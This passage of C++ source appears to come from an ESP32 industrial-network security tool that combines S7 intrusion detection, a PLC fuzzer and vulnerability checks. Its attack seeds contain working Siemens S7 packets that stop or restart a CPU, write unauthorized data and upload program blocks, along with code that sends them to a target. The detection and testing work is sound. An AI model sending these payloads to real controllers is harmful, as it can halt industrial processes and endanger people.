                             PSRAMUtils::createPSRAMString("{\"alert_type\":\"s7_tls_handshake\",\"type\":\"s7comm+\",\"event\":\"TLS_handshake\",\"note\":\"S7-1500 encrypted connection\"}"),
                             LogLevel::INFO);
        ids_events_++; alert_generated = true;
    }

    size_t s7_len=0; const uint8_t* s7 = locateS7Pdu(b,l,s7_len);
    if (!s7 || s7_len < 12 || s7[0] != 0x32) return alert_generated; // Need minimum S7 header

    const uint8_t rosctr = s7[1];
    const uint16_t par_len = be16(s7 + 6);
    const uint16_t dat_len = be16(s7 + 8);
    const size_t hdr_len = (rosctr == 0x03) ? 12U : 10U; // Ack_Data carries error class/code
    if (s7_len < hdr_len) return alert_generated;
    if (hdr_len + (size_t)par_len + (size_t)dat_len > s7_len) return alert_generated;

    const uint8_t* params = s7 + hdr_len;
    const uint8_t* data = s7 + hdr_len + par_len;

    // Determine operation kind:
    uint8_t func = 0x00;
    bool is_read_var = false;
    bool is_write_var = false;
    bool is_setup_comm = false;
    bool is_plc_control = false;
    uint8_t plc_ctrl_code = 0x00;
    uint8_t plc_mode = 0x00;

    if ((rosctr == 0x01 || rosctr == 0x02 || rosctr == 0x03) && par_len >= 1) {
        func = params[0];
        is_read_var = (func == 0x04);
        is_write_var = (func == 0x05);
        is_setup_comm = (func == 0xF0);
    } else if (rosctr == 0x07 && dat_len >= 12) {
        // Data: FF 09 00 08 + "P_PR" + "OG" + mode + func
        if (data[0] == 0xFF &&
            data[4] == 0x50 && data[5] == 0x5F && data[6] == 0x50 && data[7] == 0x52 && // P_PR
            data[8] == 0x4F && data[9] == 0x47) { // OG
            is_plc_control = true;
            plc_mode = data[10];
            plc_ctrl_code = data[11];
        }
    }

    // Rule 2: CRITICAL - STOP/RESTART CPU attempts (Userdata PLC Control)
    if (is_plc_control) {
        if (plc_ctrl_code == 0x29) { // STOP
            stop_cpu_detected_.fetch_add(1, std::memory_order_relaxed);
            char msg[220];
            snprintf(msg, sizeof(msg),
                     "{\"alert_type\":\"s7_plc_stop_attempt\",\"type\":\"s7_plc_stop_attempt\",\"severity\":\"CRITICAL\",\"src_ip\":\"%s\",\"dst_ip\":\"%s\",\"mode\":%u,\"func\":%u}",
                     pkt.src_ip.c_str(), pkt.dst_ip.c_str(), (unsigned)plc_mode, (unsigned)plc_ctrl_code);
            reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::ERROR);
            ids_events_++; alert_generated = true;
            if (sec_ && tx_ && sec_->getPolicy().block_s7_plc_stop) {
                if (sec_->mitigateTcpByRst(pkt, tx_)) {
                    stop_cpu_blocked_.fetch_add(1, std::memory_order_relaxed);
                    LOG_INFO(TAG_S7, "Applied TCP RST mitigation for PLC STOP command");
                } else {
                    LOG_WARNING(TAG_S7, "Failed to apply TCP RST mitigation for PLC STOP command");
                }
            }
        } else if (plc_ctrl_code == 0x28) { // RESTART (hot/cold)
            restart_detected_.fetch_add(1, std::memory_order_relaxed);
            char msg[220];
            snprintf(msg, sizeof(msg),
                     "{\"alert_type\":\"s7_plc_restart_attempt\",\"type\":\"s7_plc_restart_attempt\",\"severity\":\"HIGH\",\"src_ip\":\"%s\",\"dst_ip\":\"%s\",\"mode\":%u,\"func\":%u}",
                     pkt.src_ip.c_str(), pkt.dst_ip.c_str(), (unsigned)plc_mode, (unsigned)plc_ctrl_code);
            reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::WARNING);
            ids_events_++; alert_generated = true;
        }
    }

    // Rule 3-6: Behavioral analysis and frequency monitoring
    uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000ULL);

    // Convert IP strings to uint32_t for tracking
    uint32_t src = 0;
    if (!pkt.src_ip.empty()) {
        inet_aton(pkt.src_ip.c_str(), (struct in_addr*)&src);
    }

    // Rule 3: Reconnaissance - excessive READ operations
    if (is_read_var) { // Read Variable
        // Monitor for excessive read attempts (reconnaissance)
        static std::map<uint32_t, uint32_t> read_attempts;
        static std::map<uint32_t, uint32_t> read_time;

        uint32_t current_time = now_ms / 1000;
        read_attempts[src]++;

        if (read_time[src] && (current_time - read_time[src]) < 30) {
            if (read_attempts[src] > 50) { // More than 50 reads in 30 seconds
                char msg[256];
                snprintf(msg, sizeof(msg), "{\"alert_type\":\"s7_scanning\",\"type\":\"s7_scanning\",\"src_ip\":\"%s\",\"dst_ip\":\"%s\",\"reads\":%lu,\"window\":\"30s\"}",
                         pkt.src_ip.c_str(), pkt.dst_ip.c_str(), read_attempts[src]);
                reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::WARNING);
                reconnaissance_alerts_.fetch_add(1, std::memory_order_relaxed);
                alert_generated = true;
            }
        } else {
            read_attempts[src] = 1;
        }
        read_time[src] = current_time;

    } else if (is_write_var) { // Rule 4: Write Variable - always suspicious
        write_alerts_.fetch_add(1, std::memory_order_relaxed);
        char msg[128];
        snprintf(msg, sizeof(msg), "{\"alert_type\":\"s7_write\",\"type\":\"s7_write\",\"src_ip\":\"%s\",\"dst_ip\":\"%s\",\"severity\":\"HIGH\"}",
                 pkt.src_ip.c_str(), pkt.dst_ip.c_str());
        reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::WARNING);
        alert_generated = true;

        // Also track frequency of write attempts
        static std::map<uint32_t, uint32_t> write_attempts;
        static std::map<uint32_t, uint32_t> write_time;

        uint32_t current_time = now_ms / 1000;
        write_attempts[src]++;

        if (write_time[src] && (current_time - write_time[src]) < 60) {
            if (write_attempts[src] > 10) { // More than 10 writes in 60 seconds - attack!
                char attack_msg[256];
                snprintf(attack_msg, sizeof(attack_msg), "{\"alert_type\":\"s7_write_storm\",\"type\":\"s7_write_storm\",\"src_ip\":\"%s\",\"dst_ip\":\"%s\",\"writes\":%lu,\"severity\":\"CRITICAL\"}",
                         pkt.src_ip.c_str(), pkt.dst_ip.c_str(), write_attempts[src]);
                reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(attack_msg), LogLevel::ERROR);
            }
        } else {
            write_attempts[src] = 1;
        }
        write_time[src] = current_time;

    } else if (is_setup_comm) { // Rule 5: Setup Communication - monitor connection attempts
        // Monitor for multiple connection attempts (potential brute force)
        static std::map<uint32_t, uint32_t> connection_attempts;
        static std::map<uint32_t, uint32_t> connection_time;

        uint32_t current_time = now_ms / 1000;
        connection_attempts[src]++;

        if (connection_time[src] && (current_time - connection_time[src]) < 120) {
            if (connection_attempts[src] > 5) { // More than 5 connection attempts in 2 minutes
                char brute_msg[256];
                snprintf(brute_msg, sizeof(brute_msg), "{\"alert_type\":\"s7_brute_force\",\"type\":\"s7_brute_force\",\"src_ip\":\"%s\",\"dst_ip\":\"%s\",\"attempts\":%lu}",
                         pkt.src_ip.c_str(), pkt.dst_ip.c_str(), connection_attempts[src]);
                reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(brute_msg), LogLevel::WARNING);
                brute_force_alerts_.fetch_add(1, std::memory_order_relaxed);
                alert_generated = true;
            }
        } else {
            connection_attempts[src] = 1;
        }
        connection_time[src] = current_time;
    }

    // Rule 6: Malformed packet detection
    if (s7_len > l || s7[1] > s7_len) { // PDU length field validation
        reportIntrusionPSRAM(pkt,
                             PSRAMUtils::createPSRAMString("{\"alert_type\":\"s7_malformed\",\"type\":\"s7_malformed\",\"detail\":\"Invalid PDU length\"}"),
                             LogLevel::ERROR);
        alert_generated = true;
    }

    // Rule 7: Traffic flooding detection
    static std::map<uint32_t, uint32_t> total_packets;
    static std::map<uint32_t, uint32_t> total_time;

    uint32_t current_time = now_ms / 1000;
    total_packets[src]++;

    if (total_time[src] && (current_time - total_time[src]) < 60) {
        if (total_packets[src] > 100) { // More than 100 S7 packets per minute - DoS?
            char flood_msg[256];
            snprintf(flood_msg, sizeof(flood_msg), "{\"alert_type\":\"s7_flooding\",\"type\":\"s7_flooding\",\"src_ip\":\"%s\",\"dst_ip\":\"%s\",\"packets\":%lu,\"window\":\"60s\"}",
                     pkt.src_ip.c_str(), pkt.dst_ip.c_str(), total_packets[src]);
            reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(flood_msg), LogLevel::ERROR);
            flooding_alerts_.fetch_add(1, std::memory_order_relaxed);
            alert_generated = true;
        }
    } else {
        total_packets[src] = 1;
    }
    total_time[src] = current_time;

    return alert_generated;
}


bool S7Plugin::generateSeedCorpus(const FuzzJob& job, std::vector<FuzzTestCase>& out) {
    out.clear();

    LOG_INFOF(TAG_S7, "Generating seed corpus for job %lu (profile=%s, safe_mode=%s)",
              (unsigned long)job.id,
              job.profile.empty() ? "default" : job.profile.c_str(),
              job.safe_mode ? "true" : "false");

    // If an advanced attack profile was requested, prefer it over the basic seed corpus.
    // This matches Modbus behavior and enables UI profile selection for S7.
    if (!job.profile.empty() && job.profile != "default") {
        const bool unsafe_profile =
            (job.profile == "plc_stop") ||
            (job.profile == "unauthorized_write");

        if (job.safe_mode && unsafe_profile) {
            LOG_WARNINGF(TAG_S7, "Refusing unsafe S7 profile '%s' in safe_mode=true", job.profile.c_str());
            return false;
        }

        if (generateAttackSeeds(job, job.profile, out) && !out.empty()) {
            for (auto& tc : out) {
                if (tc.attack_type.empty()) tc.attack_type = job.profile;
            }
            return true;
        }
    }

    // Default/basic seed: minimal SetupComm request.
    // The execute() path will handle ISO-on-TCP handshake before sending this payload.
    FuzzTestCase setup_case; setup_case.seed_id = 1; setup_case.mutation_id = 0;
    setup_case.attack_type = "default";
    std::vector<uint8_t> setup_msg = {
        0x03, 0x00, 0x00, 0x19,
        0x02, 0xF0, 0x80,
        0x32, 0x01,
        0x00, 0x00,
        0x00, 0x01,
        0x00, 0x08,
        0x00, 0x00,
        0xF0, 0x00,
        0x00, 0x01,
        0x00, 0x01,
        0x01, 0xE0
    };
    setup_case.payload = setup_msg; out.push_back(setup_case);
    LOG_INFO("S7_PLUGIN", "Generated " + std::to_string(out.size()) + " S7 fuzzing seeds");
    return !out.empty();
}

bool S7Plugin::fixup(const FuzzJob& job, const FuzzTestCase& in, FuzzTestCase& out) {
    (void)job; out = in;
    if (out.payload.size() >= 4) {
        uint16_t tpkt_len = (uint16_t)out.payload.size();
        out.payload[2] = (uint8_t)((tpkt_len >> 8) & 0xFF);
        out.payload[3] = (uint8_t)(tpkt_len & 0xFF);
    }
    return true;
}

FuzzResult S7Plugin::execute(const FuzzJob& job, const FuzzTestCase& tc,
                            std::string& sent_hex, std::string& received_hex,
                            std::string& status_details) {
    sent_hex = bytesToHex(tc.payload);
    received_hex.clear();
    status_details.clear();

    std::string host = job.target;
    uint16_t port = 102;
    size_t colon_pos = job.target.find(':');
    if (colon_pos != std::string::npos) {
        host = job.target.substr(0, colon_pos);
        port = (uint16_t)std::stoul(job.target.substr(colon_pos + 1));
    }

    const std::string at = !tc.attack_type.empty() ? tc.attack_type : job.profile;
    const bool needs_handshake =
        (at == "default") ||
        (at == "plc_stop") ||
        (at == "unauthorized_write") ||
        (at == "program_upload");

    // Parse optional S7 parameters from extra_config (JSON string), e.g. {"rack":0,"slot":0,"timeout_ms":3000}
    uint16_t rack = 0;
    uint16_t slot = 0;
    uint32_t timeout_ms = 3000;
    auto parse_int_field = [](const std::string& s, const char* key, int& out) -> bool {
        if (!key) return false;
        std::string k = std::string("\"") + key + "\"";
        size_t p = s.find(k);
        if (p == std::string::npos) return false;
        p = s.find(':', p);
        if (p == std::string::npos) return false;
        ++p;
        while (p < s.size() && (s[p] == ' ' || s[p] == '\t' || s[p] == '\r' || s[p] == '\n')) ++p;
        bool neg = false;
        if (p < s.size() && s[p] == '-') { neg = true; ++p; }
        long v = 0;
        bool any = false;
        while (p < s.size() && s[p] >= '0' && s[p] <= '9') { any = true; v = v * 10 + (s[p] - '0'); ++p; }
        if (!any) return false;
        if (neg) v = -v;
        out = (int)v;
        return true;
    };
    if (!job.extra_config.empty()) {
        int v = 0;
        if (parse_int_field(job.extra_config, "rack", v) && v >= 0 && v <= 255) rack = (uint16_t)v;
        if (parse_int_field(job.extra_config, "slot", v) && v >= 0 && v <= 255) slot = (uint16_t)v;
        if (parse_int_field(job.extra_config, "timeout_ms", v) && v >= 200 && v <= 30000) timeout_ms = (uint32_t)v;
    }

    int sock = -1;
    if (needs_handshake) {
        S7DeviceInfo dev{};
        uint16_t src_tsap = 0, dst_tsap = 0;
        uint8_t tpdu = 0;
        psram_string attempts_json;
        psram_string err_json;
        psram_string ifkey_json;
        bool setup_ok = false;

        bool ok = s7_connect_setup_best_effort(this, host, port, timeout_ms, rack, slot,
                                              sock, dev, src_tsap, dst_tsap, tpdu,
                                              &setup_ok,
                                              ifkey_json,
                                              attempts_json, err_json);
        if (!ok || sock < 0) {
            status_details = "handshake_failed";
            if (!err_json.empty()) status_details += std::string(" ") + err_json.c_str();
            return FuzzResult::CONNECTION_FAILED;
        }
        if (!setup_ok) {
            // We still proceed: some targets may accept a subset of functions even if SetupComm is restricted.
            status_details = "setup_comm_failed";
        }
    } else {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            status_details = "socket_creation_failed errno:" + std::to_string(errno);
            return FuzzResult::SOCKET_ERROR;
        }
        configureTcpSocket(sock);

        // Bind to Ethernet (ETH_DEF)
        esp_netif_t* eth = esp_netif_get_handle_from_ifkey("ETH_DEF");
        esp_netif_ip_info_t eth_ip{};
        if (!eth || esp_netif_get_ip_info(eth, &eth_ip) != ESP_OK || eth_ip.ip.addr == 0) {
            close(sock); status_details = "ethernet_not_ready"; return FuzzResult::CONNECTION_FAILED;
        }
        struct sockaddr_in local{}; local.sin_family = AF_INET; local.sin_addr.s_addr = eth_ip.ip.addr; local.sin_port = 0;
        ::bind(sock, (struct sockaddr*)&local, sizeof(local));

        struct sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);

        if (inet_aton(host.c_str(), &addr.sin_addr) == 0 ||
            connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            close(sock);
            status_details = "connection_failed errno:" + std::to_string(errno);
            return FuzzResult::CONNECTION_FAILED;
        }
    }

    ssize_t sent = send(sock, tc.payload.data(), tc.payload.size(), 0);
    if (sent != (ssize_t)tc.payload.size()) {
        close(sock);
        status_details = "send_failed bytes_sent:" + std::to_string(sent);
        return FuzzResult::SEND_FAILED;
    }

    uint8_t response[1024];
    size_t rx_len = 0;
    bool got_frame = recv_tpkt_frame_free(sock, response, sizeof(response), rx_len);
    close(sock);

    if (got_frame && rx_len > 0) {
        std::vector<uint8_t> response_vec(response, response + rx_len);
        received_hex = bytesToHex(response_vec);
        status_details += (status_details.empty() ? "" : " ");
        status_details += "tpkt_bytes_received:" + std::to_string((unsigned)rx_len);

        // Interpret S7 response: a response frame is not automatically a "success".
        size_t s7_len = 0;
        const uint8_t* s7 = locate_s7_pdu_free(response, rx_len, s7_len);
        if (!s7 || s7_len < 10) {
            status_details += " no_s7_pdu";
            return FuzzResult::INVALID_RESPONSE;
        }

        const uint8_t rosctr = s7[1];
        const uint16_t par_len = rd16be_free(s7 + 6);
        const uint16_t dat_len = rd16be_free(s7 + 8);

        // S7 base header is 10 bytes for most ROSCTR values (JOB/ACK/USERDATA).
        // ACK_DATA (0x03) includes error class/code, making the header 12 bytes.
        size_t hdr_len = 10U;
        if (rosctr == S7::PDU_TYPE_ACK_DATA) hdr_len = 12U;
        if (s7_len < hdr_len) {
            status_details += " short_s7_header";
            return FuzzResult::INVALID_RESPONSE;
        }
        if (hdr_len + (size_t)par_len + (size_t)dat_len > s7_len) {
            status_details += " s7_length_mismatch";
            return FuzzResult::INVALID_RESPONSE;
        }

        uint8_t err_class = 0;
        uint8_t err_code = 0;
        if (hdr_len == 12U) {
            err_class = s7[10];
            err_code = s7[11];
        }

        if (err_class != 0 || err_code != 0) {
            char ebuf[64];
            snprintf(ebuf, sizeof(ebuf), " s7_error_class=0x%02X s7_error_code=0x%02X",
                     (unsigned)err_class, (unsigned)err_code);
            status_details += ebuf;
            return FuzzResult::EXCEPTION_RESPONSE;
        }

        const uint8_t* data = s7 + hdr_len + par_len;
        if (at == "unauthorized_write") {
            // For WriteVar responses, the data section carries one return code per item.
            // 0xFF = OK. Any other code means the write was rejected/failed.
            if (dat_len < 1) {
                status_details += " write_no_data";
                return FuzzResult::INVALID_RESPONSE;
            }

            bool all_ok = true;
            uint8_t first_bad = 0x00;
            for (uint16_t i = 0; i < dat_len; ++i) {
                if (data[i] != 0xFF) {
                    all_ok = false;
                    first_bad = data[i];
                    break;
                }
            }
            if (!all_ok) {
                char rbuf[96];
                snprintf(rbuf, sizeof(rbuf), " write_return_code=0x%02X", (unsigned)first_bad);
                status_details += rbuf;
                return FuzzResult::EXCEPTION_RESPONSE;
            }
            status_details += " write_return_code=0xFF";
            return FuzzResult::SUCCESS;
        }

        if (at == "plc_stop") {
            // PLC control (Userdata) encodes acceptance in the data return code (0xFF = OK).
            // If we can't confidently determine acceptance, treat it as failure to avoid false positives.
            if (dat_len < 1) {
                status_details += " plc_control_no_data";
                return FuzzResult::INVALID_RESPONSE;
            }
            const uint8_t ret = data[0];
            if (ret != 0xFF) {
                char rbuf[96];
                snprintf(rbuf, sizeof(rbuf), " plc_control_return_code=0x%02X", (unsigned)ret);
                status_details += rbuf;
                return FuzzResult::EXCEPTION_RESPONSE;
            }
            status_details += " plc_control_return_code=0xFF";
        }

        // Generic success for parsed S7 response with zero error class/code.
        return FuzzResult::SUCCESS;
    }

    // No response is common for some disruptive operations; treat as timeout.
    if (status_details.empty()) status_details = "no_response";
    return FuzzResult::TIMEOUT;
}

// ==================== FASE 7: S7 Advanced Fuzzing Seeds ====================

bool S7Plugin::generateAttackSeeds(const FuzzJob& job, const std::string& attack_type, std::vector<FuzzTestCase>& out) {
    (void)job; out.clear();
    LOG_INFOF(TAG_S7, "Generating %s attack seeds", attack_type.c_str());

    if (attack_type == "plc_stop") {
        std::string plc_control;
        if (!job.extra_config.empty()) {
            (void)parse_json_string_field_free(job.extra_config, "plc_control", plc_control);
        }

        // Attack 1: Direct PLC STOP command
        FuzzTestCase stop;
        stop.seed_id = 7001;
        stop.payload = {
            0x03,0x00,0x00,0x21,  // TPKT header (len is fixed up later)
            0x02,0xF0,0x80,        // COTP DT
            0x32,0x07,             // S7 Protocol, Userdata
            0x00,0x00,             // Redundancy ID
            0x00,0x01,             // PDU ref
            0x00,0x08,             // Param len=8
            0x00,0x0C,             // Data len=12
            0x00,0x01,0x12,        // Userdata parameter
            0x04,0x11,0x41,0x01,0x00,  // PLC Control function
            0xFF,0x09,0x00,0x08,   // Data header (len=8, matches s7_plc_control())
            0x50,0x5F,0x50,0x52,   // "P_PR" - Program
            0x4F,0x47,0x00,0x29    // "OG" + mode=0x00 + func=0x29 (STOP)
        };
        out.push_back(stop);

        // Attack 2: Cold restart
        FuzzTestCase cold_restart;
        cold_restart.seed_id = 7002;
        cold_restart.payload = stop.payload;
        cold_restart.payload[cold_restart.payload.size()-1] = 0x28;  // func 0x28 (restart)
        cold_restart.payload[cold_restart.payload.size()-2] = 0x43;  // Cold = 'C'
        out.push_back(cold_restart);

        // Attack 3: Hot restart
        FuzzTestCase hot_restart;
        hot_restart.seed_id = 7003;
        hot_restart.payload = stop.payload;
        hot_restart.payload[hot_restart.payload.size()-1] = 0x28;
        hot_restart.payload[hot_restart.payload.size()-2] = 0x48;  // Hot = 'H'
        out.push_back(hot_restart);

        // If user explicitly selected a single PLC control action, keep only that one.
        if (!plc_control.empty()) {
            std::vector<FuzzTestCase> filtered;
            if (plc_control == "stop") filtered.push_back(stop);
            else if (plc_control == "cold_restart") filtered.push_back(cold_restart);
            else if (plc_control == "hot_restart") filtered.push_back(hot_restart);
            if (!filtered.empty()) out.swap(filtered);
        }
    }

    else if (attack_type == "unauthorized_write") {
        // Build a valid WriteVar request (same structure used by s7_write_var_bytes()).
        uint8_t area = 0x84;       // DB
        uint16_t dbn = 1;
        uint32_t start_byte = 0;
        std::vector<uint8_t> value = {0xDE, 0xAD};

        if (!job.extra_config.empty()) {
            std::string area_s;
            if (parse_json_string_field_free(job.extra_config, "write_area", area_s)) {
                if (area_s == "DB") area = 0x84;
                else if (area_s == "Q") area = 0x82;
                else if (area_s == "M") area = 0x83;
            }
            int v = 0;
            if (parse_json_int_field_free(job.extra_config, "db_number", v) && v >= 0 && v <= 65535) dbn = (uint16_t)v;
            if (parse_json_int_field_free(job.extra_config, "byte_offset", v) && v >= 0) start_byte = (uint32_t)v;
            std::string hex;
            if (parse_json_string_field_free(job.extra_config, "value_hex", hex)) {
                std::vector<uint8_t> tmp;
                if (parse_hex_bytes(hex.c_str(), tmp) && !tmp.empty()) value.swap(tmp);
            }
        }

        auto build_one = [&](uint32_t seed_id, uint8_t use_area, uint16_t use_db, uint32_t use_start, const std::vector<uint8_t>& bytes) -> FuzzTestCase {
            FuzzTestCase tc;
            tc.seed_id = seed_id;

            uint8_t params[2 + 12] = {0};
            params[0] = S7::FUNC_WRITE_VAR;
            params[1] = 0x01;
            params[2] = 0x12; params[3] = 0x0A; params[4] = 0x10;
            params[5] = 0x02; // BYTE
            wr16be_free(params + 6, (uint16_t)bytes.size());
            wr16be_free(params + 8, use_db);
            params[10] = use_area;
            const uint32_t addr_bits = use_start * 8U;
            params[11] = (uint8_t)((addr_bits >> 16) & 0xFF);
            params[12] = (uint8_t)((addr_bits >> 8) & 0xFF);
            params[13] = (uint8_t)(addr_bits & 0xFF);

            const uint16_t bitlen = (uint16_t)(bytes.size() * 8U);
            const bool pad = (bytes.size() & 1U) != 0;
            const size_t data_item_len = 4U + bytes.size() + (pad ? 1U : 0U);
            const size_t total_len = 7U + 10U + sizeof(params) + data_item_len;
            tc.payload.resize(total_len);
            size_t off = 0;
            tc.payload[off++] = 0x03; tc.payload[off++] = 0x00;
            off += 2;
            tc.payload[off++] = 0x02; tc.payload[off++] = 0xF0; tc.payload[off++] = 0x80;
            tc.payload[off++] = 0x32;
            tc.payload[off++] = S7::PDU_TYPE_JOB;
            tc.payload[off++] = 0x00; tc.payload[off++] = 0x00;
            wr16be_free(tc.payload.data() + off, 0x0101); off += 2;
            wr16be_free(tc.payload.data() + off, (uint16_t)sizeof(params)); off += 2;
            wr16be_free(tc.payload.data() + off, (uint16_t)data_item_len); off += 2;
            memcpy(tc.payload.data() + off, params, sizeof(params)); off += sizeof(params);
            tc.payload[off++] = 0x00;
            tc.payload[off++] = 0x04;
            wr16be_free(tc.payload.data() + off, bitlen); off += 2;
            memcpy(tc.payload.data() + off, bytes.data(), bytes.size()); off += bytes.size();
            if (pad) tc.payload[off++] = 0x00;
            wr16be_free(tc.payload.data() + 2, (uint16_t)off);
            tc.payload.resize(off);
            return tc;
        };

        // If UI provided parameters, generate only that single-shot request.
        out.push_back(build_one(7101, area, (area == 0x84 ? dbn : 0), start_byte, value));
    }

    else if (attack_type == "program_upload") {
        // Attack 7: Upload program blocks (reconnaissance)
        FuzzTestCase upload;
        upload.seed_id = 7201;
        upload.payload = {
            0x03,0x00,0x00,0x25,  // TPKT
            0x02,0xF0,0x80,
            0x32,0x07,             // Userdata
            0x00,0x00,0x00,0x01,
            0x00,0x0C,             // Param len=12
            0x00,0x08,             // Data len=8
            0x00,0x01,0x12,        // Userdata param
            0x08,0x12,0x84,0x01,   // Upload function
            0x01,0x00,0x00,0x00,
            0xFF,0x09,0x00,0x04,   // Data
            0x4F,0x42,0x31,0x00    // Block "OB1" (Organization Block 1)
        };
        out.push_back(upload);

        // Attack 8: List all blocks
        FuzzTestCase list_blocks;
        list_blocks.seed_id = 7202;
        list_blocks.payload = {
            0x03,0x00,0x00,0x21,
            0x02,0xF0,0x80,
            0x32,0x07,
            0x00,0x00,0x00,0x01,
            0x00,0x08,0x00,0x08,
            0x00,0x01,0x12,
            0x04,0x11,0x43,0x01,0x00,  // List blocks function
            0xFF,0x09,0x00,0x04,
            0x41,0x4C,0x4C,0x00    // "ALL"
        };
        out.push_back(list_blocks);
    }

    else if (attack_type == "malformed_packets") {
        // Attack 9: TPKT length overflow
        FuzzTestCase tpkt_overflow;
        tpkt_overflow.seed_id = 7301;
        tpkt_overflow.payload = {
            0x03,0x00,0xFF,0xFF,   // TPKT: claimed length = 65535
            0x02,0xF0,0x80,
            0x32,0x01,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x00,
            0xF0,0x00,0x00,0x01,0x00,0x01,0x03,0xC0
        };
        out.push_back(tpkt_overflow);

        // Attack 10: Invalid COTP length
        FuzzTestCase cotp_invalid;
        cotp_invalid.seed_id = 7302;
        cotp_invalid.payload = {
            0x03,0x00,0x00,0x16,
            0xFF,0xF0,0x80,        // COTP len=255 (invalid)
            0x32,0x01,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x00,
            0xF0,0x00,0x00,0x01,0x00,0x01
        };
        out.push_back(cotp_invalid);

        // Attack 11: S7 parameter length mismatch
        FuzzTestCase param_mismatch;
        param_mismatch.seed_id = 7303;
        param_mismatch.payload = {
            0x03,0x00,0x00,0x19,
            0x02,0xF0,0x80,
            0x32,0x01,0x00,0x00,0x00,0x01,
            0xFF,0xFF,             // Param len = 65535 (but packet is short)
            0x00,0x00,
            0xF0,0x00,0x00,0x01,0x00,0x01,0x03,0xC0
        };
        out.push_back(param_mismatch);

        // Attack 12: Invalid function code
        FuzzTestCase invalid_func;
        invalid_func.seed_id = 7304;
        invalid_func.payload = {
            0x03,0x00,0x00,0x19,
            0x02,0xF0,0x80,
            0x32,0x01,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x00,
            0xEE,                  // Invalid function 0xEE
            0x00,0x00,0x01,0x00,0x01,0x03,0xC0
        };
        out.push_back(invalid_func);
    }

    else if (attack_type == "protocol_confusion") {
        // Attack 13: Mixed ISO-TP and S7 confusion
        FuzzTestCase proto_confusion;
        proto_confusion.seed_id = 7401;
        proto_confusion.payload = {
            0x03,0x00,0x00,0x16,
            0x11,0xE0,0x00,0x00,0x00,0x01,0x00,  // COTP CR (connection request in data flow)
            0x32,0x01,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x00,
            0xF0,0x00
        };
        out.push_back(proto_confusion);

        // Attack 14: S7 magic byte corruption
        FuzzTestCase magic_corrupt;
        magic_corrupt.seed_id = 7402;
        magic_corrupt.payload = {
            0x03,0x00,0x00,0x19,
            0x02,0xF0,0x80,
            0xFF,                  // Wrong magic (should be 0x32)
            0x01,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x00,
            0xF0,0x00,0x00,0x01,0x00,0x01,0x03,0xC0
        };
        out.push_back(magic_corrupt);

        // Attack 15: ROSCTR fuzzing (invalid PDU types)
        for (int i = 0; i < 5; i++) {
            FuzzTestCase rosctr_fuzz;
            rosctr_fuzz.seed_id = 7410 + i;
            rosctr_fuzz.payload = {
                0x03,0x00,0x00,0x19,
                0x02,0xF0,0x80,
                0x32,(uint8_t)(0x10 + i),  // Invalid ROSCTR values
                0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x00,
                0xF0,0x00,0x00,0x01,0x00,0x01,0x03,0xC0
            };
            out.push_back(rosctr_fuzz);
        }
    }

    LOG_INFOF(TAG_S7, "Generated %zu advanced S7 attack seeds for %s", out.size(), attack_type.c_str());
    return !out.empty();
}

// ==================== FASE 2: Vulnerability Checks Implementation ====================

bool S7Plugin::checkAuthentication(int sock, psram_string& finding) {
    // Test 1: Try to read CPU protection level without authentication
    S7DeviceInfo test_info;
    bool can_read_protection = readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, test_info);

    if (can_read_protection && test_info.protection_level == S7::PROTECTION_NONE) {
        finding = PSRAMUtils::createPSRAMString(
            "{\"id\":\"s7_no_protection\","
            "\"severity\":\"CRITICAL\","
            "\"detail\":\"CPU protection level is 0 - no password required for access\"}"
        );
        LOG_WARNING(TAG_S7, "VULNERABILITY: No CPU protection enabled");
        return true;  // Vulnerability found
    }

    // Test 2: Try to read module identification (should always work, but check if restricted)
    S7DeviceInfo module_info;
    bool can_read_module = readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, module_info);

    if (!can_read_module) {
        // Good - SZL reads are restricted
        finding = PSRAMUtils::createPSRAMString(
            "{\"id\":\"s7_szl_restricted\","
            "\"severity\":\"INFO\","
            "\"detail\":\"SZL reads require authentication - good security posture\"}"
        );
        return false;  // No vulnerability
    }

    return false;  // No critical vulnerability found in this test
}

bool S7Plugin::checkProtectionLevel(int sock, S7DeviceInfo& dev_info) {
    // Protection level already read during discovery
    // Here we just validate and report
    (void)sock;  // Unused in current implementation

    if (dev_info.protection_level == S7::PROTECTION_NONE) {
        LOG_WARNING(TAG_S7, "Protection: NONE (0) - Critical vulnerability");
        return false;  // Vulnerable
    } else if (dev_info.protection_level == S7::PROTECTION_WRITE) {
        LOG_INFO(TAG_S7, "Protection: Write-protected (1) - Reads allowed");
        return true;  // Partial protection
    } else if (dev_info.protection_level >= S7::PROTECTION_READ_WRITE) {
        LOG_INFO(TAG_S7, "Protection: Full (2-3) - Good security");
        return true;  // Good protection
    }

    return false;
}

bool S7Plugin::testAnonymousStop(int sock, psram_string& finding) {
    // SAFETY: We do NOT actually send STOP command without explicit authorization
    // Instead, we check if we can even construct the command (which we can)
    // A real penetration test would send this, but for passive scanning we just report capability
    (void)sock;  // Intentionally unused - we don't send the dangerous command

    finding = PSRAMUtils::createPSRAMString(
        "{\"id\":\"s7_stop_capability\","
        "\"severity\":\"WARNING\","
        "\"detail\":\"STOP CPU command can be constructed - test not sent (safety)\","
        "\"recommendation\":\"Enable CPU protection level 2 or higher\"}"
    );

    LOG_INFO(TAG_S7, "STOP test: command prepared but not sent (safety mode)");

    // Return true to indicate we COULD send it (vulnerability exists in theory)
    return true;
}

// ==================== FASE 1: Enhanced Discovery Implementation ====================

